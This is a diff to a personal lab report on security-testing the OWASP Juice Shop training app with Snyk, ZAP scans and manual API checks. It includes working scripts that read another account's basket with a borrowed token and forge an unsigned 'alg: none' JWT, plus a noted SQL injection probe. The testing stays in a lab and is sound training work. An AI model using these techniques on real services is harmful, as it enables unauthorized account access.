@@ -58,23 +58,27 @@ The checkout had `package.json`, but no `package-lock.json`. That mattered becau
 
 ### 1.2 I fixed missing Node.js and npm in WSL
 
-My first version check failed with `node: command not found` and `npm: command not found`. This was a local WSL tool prerequisite, not a Juice Shop or Snyk finding. I installed Node.js and npm using the package manager available in the lab environment, then checked the versions:
+My first version check failed with `node: command not found` and `npm: command not found`. I was in WSL, where the source checkout lived. The packages on the target server could not satisfy a missing tool in this shell. I ran the checks and installed Node.js and npm here:
 
 ```bash
+node --version
+npm --version
 sudo apt update
 sudo apt install nodejs npm
 node --version
 npm --version
 ```
 
-After installation I returned to the project directory. I installed the project dependencies so Snyk Test had a dependency tree to inspect:
+I tried Snyk Test once before the project dependencies existed. It stopped with `Missing node_modules folder: We can't test without dependencies. Please run 'npm install' first.` I then installed the dependencies in the checkout and checked that the directory existed:
 
 ```bash
 cd ~/project-2a/juice-shop-source
+"$HOME/.local/bin/snyk" test
 npm install
+ls -ld node_modules
 ```
 
-**Problem I encountered:** The first `snyk test` returned `Missing node_modules folder: We can't test without dependencies. Please run 'npm install' first.` The fix was to install the dependencies in the project checkout before repeating the scan. Later, the API setup also showed why checking the manifest and lockfile matters: without a checked-in lockfile, the locally resolved tree is not a fully reproducible record of the application's original dependency versions.
+That solved the missing-dependencies error. Because the checkout had no checked-in lockfile, the locally resolved tree was not a fully reproducible record of the original build. I kept that limit with the SCA findings.
 
 ### 1.3 I checked Snyk CLI access
 
@@ -308,26 +312,100 @@ The scan was black-box: ZAP evaluated externally visible behavior and did not in
 
 #### Reproduction commands
 
-The exact ZAP CLI invocation and exported scan configuration from the original runs were not retained in the chat, so these are reproducible CLI equivalents, not a claim that these exact lines produced the recorded counts. The results and counts above came from the completed lab scans.
+The exact ZAP CLI invocation and exported scan configuration from the original runs were not retained in the chat, so these are reproducible CLI equivalents, not a claim that these exact lines produced the recorded counts. The results and counts above came from the completed lab scans. I checked the rerun options against ZAP's [Baseline Scan documentation](https://www.zaproxy.org/docs/docker/baseline-scan/).
 
 ```bash
-mkdir -p reports/zap
+cd ~/project-2a
+mkdir -p zap-reports
 ZAP_TARGET='http://host.docker.internal:3001'
 
 # Passive baseline crawl
 docker run --rm -t \
-  -v "$PWD/reports/zap:/zap/wrk/:rw" \
+  --add-host=host.docker.internal:host-gateway \
+  -v "$PWD/zap-reports:/zap/wrk/:rw" \
   ghcr.io/zaproxy/zaproxy:stable \
   zap-baseline.py -t "$ZAP_TARGET" -r zap-baseline.html
 
 # Baseline crawl with the AJAX Spider enabled
 docker run --rm -t \
-  -v "$PWD/reports/zap:/zap/wrk/:rw" \
+  --add-host=host.docker.internal:host-gateway \
+  -v "$PWD/zap-reports:/zap/wrk/:rw" \
   ghcr.io/zaproxy/zaproxy:stable \
   zap-baseline.py -t "$ZAP_TARGET" -j -r zap-baseline-ajax.html
 ```
 
 The ZAP container must resolve `host.docker.internal` to the WSL host and reach port 3001. If it cannot, I check scanner-to-target connectivity before treating the output as a scan result. The target remains the isolated lab instance.
+
+#### I used the ZAP API to compare the two crawlers
+
+I wanted to know whether the traditional Spider had reached the application's JavaScript-loaded API routes. I checked ZAP's Spider result list, then its AJAX Spider result list. The retained outputs show **94** traditional URLs and **91** AJAX URLs; the traditional list had no `/api/` path. These are the API requests I use to repeat that comparison with an already running ZAP API. The exact original API call sequence was not saved, so I do not present these commands as the source of the recorded counts:
+
+```bash
+# WSL terminal; ZAP must already expose its API on localhost:8080.
+ZAP_API='http://127.0.0.1:8080'
+mkdir -p ~/project-2a/zap-reports
+read -r -s -p 'Local ZAP API key: ' ZAP_API_KEY; echo
+
+# Check that the ZAP API is answering before starting a crawl.
+curl -sS --get "$ZAP_API/JSON/core/view/version/" \
+  --data-urlencode "apikey=$ZAP_API_KEY"
+
+# Start a traditional Spider crawl and retain the scan ID returned by ZAP.
+SPIDER_ID="$(curl -sS --get "$ZAP_API/JSON/spider/action/scan/" \
+  --data-urlencode "apikey=$ZAP_API_KEY" \
+  --data-urlencode 'url=http://host.docker.internal:3001/' \
+  | python3 -c 'import json,sys; print(json.load(sys.stdin)["scan"])')"
+while :; do
+  SPIDER_STATUS="$(curl -sS --get "$ZAP_API/JSON/spider/view/status/" \
+    --data-urlencode "apikey=$ZAP_API_KEY" \
+    --data-urlencode "scanId=$SPIDER_ID" \
+    | python3 -c 'import json,sys; print(json.load(sys.stdin)["status"])')"
+  printf 'Traditional Spider: %s%%\n' "$SPIDER_STATUS"
+  [ "$SPIDER_STATUS" = '100' ] && break
+  sleep 5
+done
+curl -sS --get "$ZAP_API/JSON/spider/view/results/" \
+  --data-urlencode "apikey=$ZAP_API_KEY" \
+  --data-urlencode "scanId=$SPIDER_ID" \
+  -o ~/project-2a/zap-reports/spider-results.json
+
+# Start the AJAX Spider, wait until ZAP reports stopped, then save its URLs.
+curl -sS --get "$ZAP_API/JSON/ajaxSpider/action/scan/" \
+  --data-urlencode "apikey=$ZAP_API_KEY" \
+  --data-urlencode 'url=http://host.docker.internal:3001/'
+while :; do
+  AJAX_STATUS="$(curl -sS --get "$ZAP_API/JSON/ajaxSpider/view/status/" \
+    --data-urlencode "apikey=$ZAP_API_KEY" \
+    | python3 -c 'import json,sys; print(json.load(sys.stdin)["status"])')"
+  printf 'AJAX Spider: %s\n' "$AJAX_STATUS"
+  [ "$AJAX_STATUS" = 'stopped' ] && break
+  sleep 5
+done
+curl -sS --get "$ZAP_API/JSON/ajaxSpider/view/results/" \
+  --data-urlencode "apikey=$ZAP_API_KEY" \
+  -o ~/project-2a/zap-reports/ajax-spider-results.json
+unset ZAP_API_KEY
+```
+
+I counted URLs and checked which paths were new to the AJAX result. In the retained run, ten exact URL strings appeared in both lists and 81 strings appeared only in AJAX. Socket.IO query values made some URLs look unique even when they represented the same route. I treated that comparison as **discovery coverage**, then used the discovered API routes in the next section.
+
+```bash
+# WSL terminal; inspect the two saved JSON result files without printing bodies.
+python3 - <<'PY'
+import json
+from pathlib import Path
+from urllib.parse import urlparse
+
+root = Path.home() / 'project-2a/zap-reports'
+spider = set(json.loads((root / 'spider-results.json').read_text())['results'])
+ajax = set(json.loads((root / 'ajax-spider-results.json').read_text())['results'])
+for name, urls in [('traditional', spider), ('AJAX', ajax)]:
+    print(name, 'URLs:', len(urls))
+    print(name, '/api/ paths:', sum('/api/' in urlparse(url).path for url in urls))
+print('shared exact URLs:', len(spider & ajax))
+print('AJAX-only exact URLs:', len(ajax - spider))
+PY
+```
 
 
 ## 5. API Security
@@ -338,19 +416,81 @@ I used two methods to assess API security. ZAP API Scan discovered routes and se
 
 The AJAX Spider and API Scan surfaced routes including challenge and quantity endpoints, product search, languages, application version/configuration, and user-related routes. The API Scan imported 16 URLs and reported 53 total URLs, 108 PASS checks, 0 FAIL, and 7 warning types. Its report listed 37 endpoints, all using GET, and noted slow responses. It was unauthenticated and covered only the imported API surface plus scanner-generated requests.
 
-For a repeatable CLI run, I need an OpenAPI definition containing the API routes to assess. The original import file was not retained in the project folder, so this is a command template for rerunning the scan after exporting or rebuilding that definition:
+For a repeatable CLI run, I need an OpenAPI definition containing the routes to assess. The original import file was not retained. I can build a **small replacement definition from the routes preserved in the AJAX output**, then run the ZAP API Scan. This replacement covers the seven routes listed below; it will not reproduce the original report's 16 imported URLs, 37 endpoints, or alert counts exactly. I record the original results above and use these commands as a runnable portfolio example:
 
 ```bash
+cd ~/project-2a
+mkdir -p zap-reports
+cat > juice-shop-api.yaml <<'YAML'
+openapi: 3.0.3
+info:
+  title: Juice Shop lab API route sample
+  version: '1.0'
+servers:
+  - url: http://host.docker.internal:3001
+paths:
+  /api/Challenges/:
+    get:
+      parameters:
+        - {name: name, in: query, schema: {type: string}}
+      responses: {'200': {description: Challenge data}}
+  /api/Quantitys/:
+    get:
+      responses: {'200': {description: Quantity data}}
+  /rest/admin/application-configuration:
+    get:
+      responses: {'200': {description: Application configuration}}
+  /rest/admin/application-version:
+    get:
+      responses: {'200': {description: Application version}}
+  /rest/continue-code:
+    get:
+      responses: {'200': {description: Continue code response}}
+  /rest/languages:
+    get:
+      responses: {'200': {description: Languages}}
+  /rest/products/search:
+    get:
+      parameters:
+        - {name: q, in: query, schema: {type: string}}
+      responses: {'200': {description: Search results}}
+YAML
+
 docker run --rm -t \
+  --add-host=host.docker.internal:host-gateway \
   -v "$PWD:/zap/wrk/:rw" \
   ghcr.io/zaproxy/zaproxy:stable \
   zap-api-scan.py \
   -t /zap/wrk/juice-shop-api.yaml \
   -f openapi \
-  -r /zap/wrk/reports/zap/api-scan.html
+  -r /zap/wrk/zap-reports/juice-shop-api-active.html
 ```
 
-The imported definition and authentication configuration determine coverage. The recorded API Scan was unauthenticated, so it did not test the two-account authorization case below.
+The imported definition and authentication configuration determine coverage. The recorded API Scan was unauthenticated, so it did not test the two-account authorization case below. The replacement command follows ZAP's [API Scan documentation](https://www.zaproxy.org/docs/docker/api-scan/). When I reviewed the original HTML report, I used this parser to find the SQL Injection alert and the affected route without dumping the whole report to the terminal:
+
+```bash
+python3 - <<'PY'
+from html.parser import HTMLParser
+from pathlib import Path
+
+class Text(HTMLParser):
+    def __init__(self):
+        super().__init__()
+        self.parts = []
+    def handle_data(self, value):
+        if value.strip():
+            self.parts.append(value.strip())
+
+report = Path.home() / 'project-2a/zap-reports/juice-shop-api-active.html'
+parser = Text()
+parser.feed(report.read_text(errors='replace'))
+body = ' '.join(' '.join(parser.parts).split())
+for term in ('SQL Injection', '/rest/products/search'):
+    pos = body.lower().find(term.lower())
+    print(f'--- {term} ---')
+    print(body[max(0, pos - 300):pos + 900] if pos >= 0 else 'Not found')
+PY
+```
 
 
 ZAP reported a SQL Injection alert on `GET /rest/products/search?q=q%27` with an HTTP 500 response. Source review independently found that `routes/search.ts` interpolated the query value into a SQL template string. I recorded unsafe SQL construction as a source-confirmed weakness, while making clear that the scanner's 500 was not proof of data extraction. The SQL injection route is also an intentional Juice Shop training challenge.
@@ -359,7 +499,7 @@ Other ZAP API observations included server-error responses, unexpected content t
 
 I then inspected selected responses and kept tool evidence separate from manual evidence. A route returning `200` is not automatically a vulnerability: the response data and intended access policy matter.
 
-These read-only GET requests reproduce several of the manual response checks from WSL after the port-3001 tunnel is returning HTTP 200:
+Once the port-3001 tunnel returned HTTP 200, I checked selected API responses from **WSL**. I used read-only GET requests to compare status codes, headers, and response fields with ZAP's observations:
 
 ```bash
 BASE='http://localhost:3001'
@@ -380,14 +520,27 @@ For example, the public `/api/Quantitys/` endpoint returned 56 inventory records
 
 ### 5.2 I tested cross-account basket authorization
 
-The automated API scan was unauthenticated, so it could not establish cross-account object authorization. I used Account A and Account B, recorded each account's own basket ID, then issued read-only requests for the other account's basket. The output showed HTTP 200 in both directions and returned the other account's basket ID. This confirmed a lab Broken Object Level Authorization (BOLA) issue, recorded as **API-01** and linked to GitHub Issue #1.
+The automated API scan was unauthenticated, so it could not establish cross-account object authorization. Before sending a live request, I examined the basket route and its tests in the source checkout. The saved source output showed `GET /rest/basket/:id`, a basket lookup by the requested ID, and tests for cross-user access and forged JWTs. I use these commands to revisit those lines from the **WSL terminal**; the exact original source-search command was not retained:
+
+```bash
+cd ~/project-2a/juice-shop-source
+grep -n -C 4 "app.get('/rest/basket/:id'" server.ts
+sed -n '1,70p' routes/basket.ts
+sed -n '40,125p' test/api/basket.test.ts
+```
+
+Source review gave me a test hypothesis, but I still needed a live response from the running container. My first login script through the WSL tunnel reached a socket but timed out waiting for a response. I moved this check to the **target VM**, where the container bridge had already returned HTTP 200. I used Account A and Account B, recorded each account's own basket ID, then issued read-only requests for the other account's basket. The output showed HTTP 200 in both directions and returned the other account's basket ID. This confirmed a lab Broken Object Level Authorization (BOLA) issue, recorded as **API-01** and linked to GitHub Issue #1.
 
 The test demonstrated cross-account basket access. It did not inspect basket contents or attempt a state-changing operation, so the evidence is limited to the unauthorized object reference/read behavior observed.
 
-To repeat the check from the **WSL terminal**, I log in to both designated lab accounts and keep their tokens and basket IDs in shell variables. The Python helper prompts for each password without echoing it, and the output is captured rather than printed. I use only the two test accounts created for this lab:
+Before running the account script on the **target VM**, I confirmed the existing container and its bridge address. The initial version of my script used `input()` for an email while its code was supplied through a heredoc; that returned `EOFError` because standard input was already feeding the script. I switched both prompts to `getpass.getpass()`, which reads from the terminal. The code below reconstructs the successful read-only sequence from the preserved outputs; the original full script was not saved. I use only the two accounts created for this lab:
 
 ```bash
-BASE='http://localhost:3001'
+sudo docker ps --filter name=juice-shop
+CONTAINER_IP="$(sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' juice-shop)"
+BASE="http://$CONTAINER_IP:3000"
+curl -sS -o /dev/null -w 'Target bridge HTTP %{http_code}\n' \
+  --max-time 5 "$BASE/"
 
 login_account() {
   python3 - "$BASE" "$1" <<'PY'
@@ -419,29 +572,48 @@ RESULT_B="$(login_account B)" || exit 1
 TOKEN_B="${RESULT_B%%|*}"
 BASKET_B="${RESULT_B#*|}"
 
-# Control requests: each account reads its own basket
-curl -sS -w '\nHTTP %{http_code}\n' \
-  -H "Authorization: Bearer $TOKEN_A" "$BASE/rest/basket/$BASKET_A"
-curl -sS -w '\nHTTP %{http_code}\n' \
-  -H "Authorization: Bearer $TOKEN_B" "$BASE/rest/basket/$BASKET_B"
+# I printed only HTTP status and the returned basket ID, not response contents.
+export BASE TOKEN_A TOKEN_B BASKET_A BASKET_B
+python3 - <<'PY'
+import json
+import os
+import urllib.request
 
-# Read-only authorization checks: request the other account's basket
-curl -sS -w '\nHTTP %{http_code}\n' \
-  -H "Authorization: Bearer $TOKEN_A" "$BASE/rest/basket/$BASKET_B"
-curl -sS -w '\nHTTP %{http_code}\n' \
-  -H "Authorization: Bearer $TOKEN_B" "$BASE/rest/basket/$BASKET_A"
+base = os.environ['BASE']
+a, b = os.environ['BASKET_A'], os.environ['BASKET_B']
+ta, tb = os.environ['TOKEN_A'], os.environ['TOKEN_B']
+cases = [('A own', ta, a), ('B own', tb, b),
+         ('A reads B', ta, b), ('B reads A', tb, a)]
+for label, token, basket_id in cases:
+    req = urllib.request.Request(
+        f'{base}/rest/basket/{basket_id}',
+        headers={'Authorization': f'Bearer {token}', 'Accept': 'application/json'},
+    )
+    with urllib.request.urlopen(req, timeout=10) as response:
+        payload = json.load(response)
+        returned_id = payload.get('data', {}).get('id')
+        print(f'{label}: HTTP {response.status}; returned basket ID={returned_id}')
+PY
 ```
 
-The two cross-account requests returned HTTP 200 and the other account's basket ID. I used only the two designated lab accounts and read-only requests.
+The preserved terminal result was:
+
+```text
+Account A reading its own basket: HTTP 200; returned basket ID=6
+Account B reading its own basket: HTTP 200; returned basket ID=7
+Account A reading Account B's basket: HTTP 200; returned basket ID=7
+Account B reading Account A's basket: HTTP 200; returned basket ID=6
+```
+
+I did not print bearer tokens or basket contents. This manual result answered an access-control question that the unauthenticated ZAP run did not cover.
 
 ### 5.3 I checked whether an unsigned JWT was accepted
 
 I used a test account and sent a read-only basket request with an unsigned JWT (`alg: none`). The service returned HTTP 200 and a basket ID. This confirmed that the lab accepted an unsigned token for that protected read, recorded as **API-02** and linked to GitHub Issue #2. The broader consequences, such as using the token to impersonate other users or perform writes, were not tested.
 
-I used the same Account A session for the token check. In the **WSL terminal**, this command changes only the JWT header to `alg: none`, removes the signature, and sends a read-only basket request. The account token stays in a shell variable and is not saved in the repository:
+I used the same Account A session for the token check on the **target VM**. The reconstructed command changes only the JWT header to `alg: none`, removes the signature, and sends a read-only basket request. The account token stays in a shell variable and is not saved in the repository:
 
 ```bash
-BASE='http://localhost:3001'
 export TOKEN_A
 TOKEN_NONE="$(python3 - <<'PY'
 import base64, json, os
@@ -456,13 +628,25 @@ header = b64url(json.dumps({'alg': 'none', 'typ': 'JWT'}, separators=(',', ':'))
 print(header + '.' + parts[1] + '.')
 PY
 )"
-curl -sS -w '\nHTTP %{http_code}\n' \
-  -H "Authorization: Bearer $TOKEN_NONE" \
-  "$BASE/rest/basket/$BASKET_A"
-unset TOKEN_A TOKEN_B TOKEN_NONE RESULT_A RESULT_B BASKET_A BASKET_B
+export BASE TOKEN_NONE BASKET_A
+python3 - <<'PY'
+import json
+import os
+import urllib.request
+
+req = urllib.request.Request(
+    f"{os.environ['BASE']}/rest/basket/{os.environ['BASKET_A']}",
+    headers={'Authorization': f"Bearer {os.environ['TOKEN_NONE']}"},
+)
+with urllib.request.urlopen(req, timeout=10) as response:
+    payload = json.load(response)
+    print('Unsigned token: HTTP', response.status,
+          '; returned basket ID=', payload.get('data', {}).get('id'))
+PY
+unset TOKEN_A TOKEN_B TOKEN_NONE RESULT_A RESULT_B BASKET_A BASKET_B BASE
 ```
 
-This is an intentionally negative authentication check against the isolated Juice Shop lab. The recorded result was HTTP 200; it did not modify data.
+The preserved terminal result was `Unsigned-token request: HTTP 200; returned basket ID=6`. I did not modify data.
 
 **Safety and evidence note:** The purpose was to demonstrate authentication validation in the training app. I did not test real accounts or a production service, and I did not use the test to modify basket state.
 
